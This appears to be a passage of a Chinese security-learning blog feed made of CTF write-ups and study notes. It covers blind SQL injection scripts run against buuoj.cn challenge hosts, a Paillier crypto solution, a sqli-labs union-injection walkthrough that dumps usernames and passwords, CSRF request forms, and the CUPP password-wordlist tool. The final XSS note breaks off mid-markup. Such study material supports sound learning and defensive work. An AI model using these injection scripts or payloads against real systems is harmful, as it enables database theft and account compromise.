alt="image-20200429215354204"></p><p>第二种是这次需要学习的二分法。</p><p>关于二分法的知识：</p><blockquote><ul><li><p>首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。</p></li><li><p>如果目标元素大于/小于中间元素，则在数组大于/小于中间元素的那一半区域查找，然后重复步骤（1）的操作。</p></li><li><p>如果某一步数组为空，则表示找不到目标元素。</p></li></ul></blockquote><p>也很好理解，对于这题，首先取第一个字符的Ascii值同(32,130)的中间值相比较,如果正好相等，则输出字符，如果Ascii的值大于中间值，则取中间值到最大值这一范围的中间值继续同字符的Ascii值比较，重复上述操作直到两个值相等为止，最终输出整个字符串。按照这个思路编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://c23802b8-f4bb-43f3-ae9e-aedcd32d9481.node3.buuoj.cn/index.php"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">min_value = <span class="number">33</span></span><br><span class="line">max_value = <span class="number">130</span></span><br><span class="line">mid = (min_value+max_value)//<span class="number">2</span> <span class="comment">#中值</span></span><br><span class="line"><span class="keyword">while</span>(min_value&lt;max_value):</span><br><span class="line">payload =&#123;<span class="string">"id"</span> : <span class="string">"0^"</span> + <span class="string">"(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span>.format(i,mid)&#125;</span><br><span class="line">html = requests.post(url,data=payload)</span><br><span class="line">print(payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Hello, glzjin wants a girlfriend."</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            <span class="comment">#ascii值比mid值大</span></span><br><span class="line">min_value = mid+<span class="number">1</span>   </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max_value = mid</span><br><span class="line">mid = (min_value+max_value)//<span class="number">2</span></span><br><span class="line">    <span class="comment">#找不到目标元素时停止</span></span><br><span class="line"><span class="keyword">if</span>(chr(mid)==<span class="string">" "</span>):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result += chr(mid)</span><br><span class="line">print(result)</span><br><span class="line">print(<span class="string">"fina flag:"</span>,result)</span><br></pre></td></tr></table></figure><p>同样得到flag，并且速度比枚举法要快的多。</p><p><img src="/images/image-20200429215721640.png" alt="image-20200429215721640"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>拓展了盲注知识</li><li>脚本技能又增长了一点点</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒四月春季战[not RSA]</title>
      <link href="/2020/04/26/note9/"/>
      <url>/2020/04/26/note9/</url>
      
        <content type="html"><![CDATA[<p>​                                                                    </p><p>安恒四月赛的一道crypto题，学习写脚本的第n天。</p><a id="more"></a><p>下载附件得：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,p,q</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">n=p*q</span><br><span class="line">g=n+<span class="number">1</span></span><br><span class="line">r=random.randint(<span class="number">1</span>,n)</span><br><span class="line"></span><br><span class="line">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"c=%d"</span>%(c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"n=%d"</span>%(n)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">c=29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line"><span class="string">n=6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>分析一下。</p><p>从 secret 导入flag，p，q的值，flag经bytes_to_long处理转换为长整数传递给m，n为p,q乘积，g的值为n+1，r是由random.randint(1,n)产生的 1 到 n 的一个整数型随机数。</p><p>再看c的等式，对于pow()函数，pow(x,y,z)表示x的y次幂除以z的余数，即等价于x**y%z，即c的值经过两个pow函数的乘积再对n的平方取余。</p><p>最后是打印出c,n的值，且下方已给出。</p><p>题目明确说了不是RSA，看了半天也没看出来这是个什么算法，后来才知道是<a href="https://en.wikipedia.org/wiki/Paillier_cryptosystem" target="_blank" rel="noopener">Paillier_cryptosystem</a>，得知加密方式为：</p><p><img src="/images/image-20200426184805920.png" alt="image-20200426184805920"></p><p>可以看到c的等式符合，再验证一下r：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">from math import gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n&#x3D;6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span><br><span class="line"></span><br><span class="line">r&#x3D;random.randint(1,n)</span><br><span class="line">if gcd(r,n)&#x3D;&#x3D;1:</span><br><span class="line">    print(&#39;right&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200426185142142.png" alt="image-20200426185142142"></p><p>符合加密方式。接下来按照解密方式编写脚本即可：</p><p><img src="/images/image-20200426185319190.png" alt="image-20200426185319190"></p><p>嗯。。。这里又看懵了，继续找资料，在wiki上找到：</p><ul><li>L(x)=(x−1)/n</li><li>本题p,q的长度相等，λ，μ的值如下：</li></ul><p><img src="/images/image-20200426191435535.png" alt="image-20200426191435535"></p><p>好的一步一步来，首先分解n，这里用yafu很快就算出来了(factordb无效，再次吐槽)：</p><p><img src="/images/image-20200426192429587.png" alt="image-20200426192429587"></p><p>然后尝试套用公式写脚本，太菜了。。。。写了蛮久，学到了gmpy库的powmod函数用法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> powmod,invert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class="line">q = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class="line">n=<span class="number">6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line">c=<span class="number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>) </span><br><span class="line">lamuda = phi <span class="comment">#λ</span></span><br><span class="line">mo = powmod(c,lamuda,n*n) <span class="comment">#快速幂取模方法</span></span><br><span class="line">miu = invert(lamuda,n) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x<span class="number">-1</span>)//n </span><br><span class="line"></span><br><span class="line">m = L(mo)</span><br><span class="line">fina = (m*miu)%n</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(fina)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="/images/image-20200426203419593.png" alt="image-20200426203419593"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>了解到了没见过的加密方式</li><li>脚本技能增长了一点点</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不含in的注入</title>
      <link href="/2020/04/16/note8/"/>
      <url>/2020/04/16/note8/</url>
      
        <content type="html"><![CDATA[<p>在buu平台做题时遇见了一种新的注入姿势，记录下来。</p><a id="more"></a><h5 id="题目：-GYCTF2020-Ezsqli"><a href="#题目：-GYCTF2020-Ezsqli" class="headerlink" title="题目： [GYCTF2020]Ezsqli"></a>题目： [GYCTF2020]Ezsqli</h5><p>打开题目链接出现一张威武大哥照片，在网页底部找到查询框猜测为注入：</p><p><img src="/images/image-20200416214447439.png" alt="image-20200416214447439"></p><p>一番瞎操作无果下fuzz一下，过滤了and,or,join,union select,in,information_schema_tables等关键词，常规注入无法进行</p><p>于是很自觉的打开了百度搜wp</p><p>学到了新姿势，使用sys.x$schema_flattened_keys代替information_schema进行盲注，参考一波大佬的讲解<a href="https://zhuanlan.zhihu.com/p/101759537?from_voters_page=true" target="_blank" rel="noopener">无须in的盲注</a><br>以及<a href="https://blog.csdn.net/weixin_43536759/article/details/104847916" target="_blank" rel="noopener">MySQL和MariaDB提取表和列的方法</a></p><p>嫖一波大佬的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">'http://5564dc2f-bb51-401c-b40f-3a82ae27e269.node3.buuoj.cn/index.php'</span></span><br><span class="line">link=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"1 &amp;&amp; ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"#"</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        res=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag=flag+chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            link=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到表名</p><p><img src="/images/image-20200416221001579.png" alt="image-20200416221001579"></p><p>继续看wp，又学到无列名注入，参考：<a href="https://zhuanlan.zhihu.com/p/98206699?utm_source=wechat_session" target="_blank" rel="noopener">二向箔安全学院无列名注入</a></p><p>颖奇L’Amore师傅的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Author: 颖奇L'Amore</span></span><br><span class="line"><span class="string">Blog: www.gem-love.com</span></span><br><span class="line"><span class="string">本文链接： https://www.gem-love.com/ctf/1669.html</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://5564dc2f-bb51-401c-b40f-3a82ae27e269.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(flag)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += hex(ord(i))</span><br><span class="line">    res = <span class="string">'0x'</span> + res.replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>): <span class="comment">#这循环一定要大 不然flag长的话跑不完</span></span><br><span class="line">    hexchar = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">        hexchar = trans(flag+ chr(char))</span><br><span class="line">        payload = <span class="string">'2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))'</span>.format(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到flag</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.information_schema无法使用时使用sys.x$schema_flattened_keys替代，另外还可使用mysql.innodb_table_stats显示更多表：</p><p><img src="/images/image-20200416223908444.png" alt="image-20200416223908444"></p><p>2.无列名注入，还有待学习</p><p>3.mysql小tips：MySQL遇到hex会自动转成字符串，所以脚本进行了hex()操作。</p><p>4.想像大佬们一样写脚本</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL学习日记</title>
      <link href="/2020/01/15/note6/"/>
      <url>/2020/01/15/note6/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="1-概念及原理"><a href="#1-概念及原理" class="headerlink" title="1.概念及原理"></a>1.概念及原理</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，之后再将这些参数传递给后台的SQL服务器加以解析并执行，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。(百度百科)<a id="more"></a></p><h3 id="2-注入类型"><a href="#2-注入类型" class="headerlink" title="2.注入类型"></a>2.注入类型</h3><h5 id="参考文章https-www-cnblogs-com-zyh0430-p-11202429-html"><a href="#参考文章https-www-cnblogs-com-zyh0430-p-11202429-html" class="headerlink" title="参考文章https://www.cnblogs.com/zyh0430/p/11202429.html"></a>参考文章<code>https://www.cnblogs.com/zyh0430/p/11202429.html</code></h5><h3 id="3-sql基本流程"><a href="#3-sql基本流程" class="headerlink" title="3.sql基本流程"></a>3.sql基本流程</h3><p>假设当前URL为<code>http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1</code><br>(1)输入单引号 ‘ 进行检验是否存在输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1 ‘</span><br></pre></td></tr></table></figure><p>(2)检验是字符型还是数字型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php?  id=1%  and 1=2</span><br></pre></td></tr></table></figure><p>   报错即为数字型<br>(3)查看这个网站所错在的表有几列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1 order by 3</span><br></pre></td></tr></table></figure><p>使用二分法，如果输入错误则报错，如果存在就维持原状。<br>(4)进行 union select联合查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p>(5) 输入 version() 发现输出位查询数据库版本号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,version() %23</span><br></pre></td></tr></table></figure><p>(6)查询数据库所拥有的表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php?id=-1 union select1,2,group_concat(table_name)from information_schema.tables <span class="built_in">where</span> table_schema = database() %23</span><br></pre></td></tr></table></figure><p>(7)查询出users表里的列名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,group_concat(column_name)%20from information_schema.columns <span class="built_in">where</span> table_schema = database() and table_name =<span class="string">"users"</span>%23</span><br></pre></td></tr></table></figure><p>(8)查出users表中username列中用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2, group_concat(username) from security.users %23</span><br></pre></td></tr></table></figure><p>(9)查出user表中的password列中密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2, group_concat(password) from security.users %23</span><br></pre></td></tr></table></figure><h3 id="sql注入实例-ctf"><a href="#sql注入实例-ctf" class="headerlink" title="sql注入实例(ctf)"></a>sql注入实例(ctf)</h3><p>“百度杯”CTF比赛 九月场SQLi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_40709439/article/details/82027422</span><br></pre></td></tr></table></figure><p>“百度杯”CTF比赛 九月场SQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/0a82851bb1c2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习日记(五）</title>
      <link href="/2019/11/06/note5/"/>
      <url>/2019/11/06/note5/</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h2><p>全称Cross-site request forgery，是一种利用网站对用户网页浏览器的信任来挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。<a id="more"></a></p><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>当下的web应用大都使用cookie来识别用户身份，只要不退出或者关闭浏览器，以后访问该网站下的页面的时候，对于用户的每一个请求，Web浏览器都会主动附带该网站的cookie来标识身份，如此用户就不需要重新认证就可以被网站识别。<br>这时如果从第三方web页面发起对当前网站域下的请求，该请求也会带上当前网站的cookie（包括对Web页面中任意文件如IMG的请求），这种认证方式称之为隐式认证，攻击者正是利用该缺陷实施CSRF攻击。</p><h5 id="示意图"><a href="#示意图" class="headerlink" title="示意图"></a>示意图</h5><p><img src="https://img-blog.csdnimg.cn/20191106200247637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="常见CSRF方式"><a href="#常见CSRF方式" class="headerlink" title="常见CSRF方式"></a>常见CSRF方式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;img&gt;标签属性</span><br><span class="line">&lt;img src=<span class="string">"http://www.te***.com/?command"</span>&gt;</span><br><span class="line">2.&lt;script&gt;标签属性</span><br><span class="line">&lt;script src=<span class="string">"http://www.test.com/?command"</span>&gt;</span><br><span class="line">3.&lt;iframe&gt;</span><br><span class="line">&lt;iframe src=<span class="string">"http://www.te***.com/?command"</span>&gt;</span><br><span class="line">4.JavaScript对象</span><br><span class="line">（1）&lt;script&gt;</span><br><span class="line">var foo = new Image () ;</span><br><span class="line">foo.src = <span class="string">"http: / /www. te*** . com/ ?command"</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">（2）XMLHTTP</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var post_data = <span class="string">' name-value '</span> ;</span><br><span class="line">var xmlhttp=new ActiveXobject ( <span class="string">"Microsoft. XMLHTTP"</span>) ;</span><br><span class="line">xmlhttp. open (<span class="string">"POST"</span>, <span class="string">'http:/ / www. te*** . com/file.ext'</span>, <span class="literal">true</span>):</span><br><span class="line">xmlhttp. onreadystatechange = <span class="keyword">function</span> () </span><br><span class="line">&#123;<span class="keyword">if</span> (xmlhttp. readyState == 4)</span><br><span class="line">&#123;</span><br><span class="line">      alert (xmlhttp. responseText) ;      </span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.send(post_data) ;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h4><p>推荐文章：<a href="https://www.2cto.com/article/201310/248996.html" target="_blank" rel="noopener">https://www.2cto.com/article/201310/248996.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个字典生成工具</title>
      <link href="/2019/11/06/note7/"/>
      <url>/2019/11/06/note7/</url>
      
        <content type="html"><![CDATA[<p>在逛论坛的时候偶然看到一个字典生成工具，叫CUPP，感觉挺有意思，于是在github上D下来试试看<a id="more"></a>，github上搜索即得<br><img src="https://img-blog.csdnimg.cn/20200109200732805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">用python3运行脚本cupp.py显示帮助<br><img src="https://img-blog.csdnimg.cn/2020010920105938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">-h此菜单</p><p>-i有关用户密码分析的交互式问题</p><p>-w使用此选项来配置现有字典，</p><p>或WyD.pl输出以制作一些pwnsauce</p><p>-l从存储库下载巨大的单词列表</p><p>-a直接从Alecto DB解析默认的用户名和密码。</p><p>Project Alecto使用Phenoelit和CIRT的纯化数据库，这些数据库经过合并和增强。</p><p>-v程序版本<br>我试验了使用cupp.py -i通过个人信息生成字典，这里可以看到它通过一些个人相关问题来收集信息<br><img src="https://img-blog.csdnimg.cn/20200109201934957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">输入相关信息后自动生成字典在文件目录下<br><img src="https://img-blog.csdnimg.cn/20200109202048701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">拿自己的个人信息试了一下，发现了我一些账号的弱密码，再次感受到信息泄露的可怕，同时，它提醒我是时候把自己的那些弱密码账号清理掉了。</p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习日记(四）</title>
      <link href="/2019/11/04/note4/"/>
      <url>/2019/11/04/note4/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS漏洞发掘"><a href="#XSS漏洞发掘" class="headerlink" title="XSS漏洞发掘"></a>XSS漏洞发掘</h2><h4 id="记录几种发掘xss漏洞的方法"><a href="#记录几种发掘xss漏洞的方法" class="headerlink" title="记录几种发掘xss漏洞的方法"></a>记录几种发掘xss漏洞的方法<a id="more"></a></h4><h4 id="主要有三种方法：白盒测试，黑盒测试，灰盒测试"><a href="#主要有三种方法：白盒测试，黑盒测试，灰盒测试" class="headerlink" title="主要有三种方法：白盒测试，黑盒测试，灰盒测试"></a>主要有三种方法：白盒测试，黑盒测试，灰盒测试</h4><h4 id="1-自动化测试工具-黑盒"><a href="#1-自动化测试工具-黑盒" class="headerlink" title="1.自动化测试工具(黑盒)"></a>1.自动化测试工具(黑盒)</h4><p>使用专业的xss漏洞自动化测试工具，能够快速有效的发掘漏洞，如Ratproxy(<a href="http://code.google.com/p/ratproxy/" target="_blank" rel="noopener">http://code.google.com/p/ratproxy/</a>)</p><h4 id="2-手动测试-黑盒"><a href="#2-手动测试-黑盒" class="headerlink" title="2.手动测试(黑盒)"></a>2.手动测试(黑盒)</h4><p>人工测试主要是配合查看客户端的HTML源文件发掘xss,输入<code>“&lt;script&gt;alert(0)&lt;/script&gt;”</code>等XSS攻击字符串并提交给应用程序的每个参数，然后监控这个输入的响应。如果目标程序没有对攻击字符串做出过滤,消毒和转义处理，就可以确认应用程序存在xss漏洞。<br>例如，如果针对页面的输入框进行测试，首先可以输入一些能触发xss的敏感字符，如：&lt;    &gt;    “    ‘    &amp;    #，如果这些基本字符都未被转义，则该输入框大概率存在xss漏洞，我们就可以再借此构造完整的xss代码进行测试。<br>或者我们也可以直接输入以下完整的xss代码进行尝试，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 